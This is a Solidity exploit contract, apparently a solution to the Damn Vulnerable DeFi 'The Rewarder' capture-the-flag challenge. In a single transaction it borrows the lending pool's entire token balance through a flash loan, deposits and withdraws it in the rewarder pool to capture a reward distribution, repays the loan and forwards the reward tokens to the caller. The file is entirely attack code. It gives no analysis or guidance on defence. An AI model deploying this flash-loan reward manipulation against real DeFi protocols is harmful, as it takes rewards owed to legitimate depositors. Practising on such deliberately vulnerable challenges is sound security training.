import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./AccountingToken.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract HackRewarder {
    // 1. get flashloan of dvt
    // 2. deposit to get acc tokens
    // 3. withdraw to get dvt back
    // 4. repay flashloan
    // 5. send tokens to attacker

    using Address for address;

    FlashLoanerPool pool;
    DamnValuableToken dvt;
    RewardToken rwt;
    TheRewarderPool rewarderPool;

    constructor(
        address _dvt,
        address _pool,
        address _rewarderPool,
        address _rewardToken
    ) {
        pool = FlashLoanerPool(_pool);
        dvt = DamnValuableToken(_dvt);
        rewarderPool = TheRewarderPool(_rewarderPool);
        rwt = RewardToken(_rewardToken);
    }

    function hack() public {
        pool.flashLoan(dvt.balanceOf(address(pool)));

        rwt.transfer(msg.sender, rwt.balanceOf(address(this)));
    }

    fallback() external {
        uint256 balance = dvt.balanceOf(address(this));

        dvt.approve(address(rewarderPool), balance);

        rewarderPool.deposit(balance);
        rewarderPool.withdraw(balance);

        dvt.transfer(address(pool), balance);
    }
}
